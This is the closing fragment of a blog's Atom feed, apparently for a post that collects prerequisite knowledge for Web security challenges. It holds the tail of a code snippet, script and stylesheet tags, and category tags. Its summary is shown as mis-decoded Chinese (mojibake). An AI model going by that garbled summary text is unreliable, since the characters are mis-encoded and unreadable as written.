class="variable">$new_iv</span>));</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/kyriota/css/spoiler.css" type="text/css"><script src="/kyriota/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;p&gt;ç³»ç»Ÿæ€§æ”¶å½•è§£å†³Webé¢˜ç›®éœ€è¦çš„å‰ç½®çŸ¥è¯†ï¼Œè¿‡äºé›¶ç¢çš„çŸ¥è¯†æœªæ•´åˆ&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="https://kyriota.github.io/categories/Web/"/>
    
    
    <category term="Web" scheme="https://kyriota.github.io/tags/Web/"/>
    
  </entry>
  
</feed>
